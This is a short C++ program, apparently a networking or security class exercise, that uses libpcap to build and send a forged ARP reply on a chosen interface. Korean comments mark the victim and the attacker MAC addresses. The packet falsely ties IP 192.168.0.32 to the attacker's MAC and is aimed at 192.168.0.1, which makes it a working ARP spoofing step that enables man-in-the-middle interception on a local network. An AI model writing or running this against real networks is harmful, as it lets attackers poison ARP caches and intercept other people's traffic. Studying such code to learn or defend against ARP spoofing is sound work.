#include <cstdio>
#include <stdio.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
//ARP 패킷을 발생시키는 함수
#pragma pack(push, 1)
struct EthArpPacket final { //arp packet   ethernet h -> arp h
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	//pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");  //희생자
    packet.eth_.smac_ = Mac("00:0c:29:38:75:2f"); //공격자
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply); //request -> reply
    packet.arp_.smac_ = Mac("00:0c:29:38:75:2f");
    packet.arp_.sip_ = htonl(Ip("192.168.0.32"));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip("192.168.0.1"));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
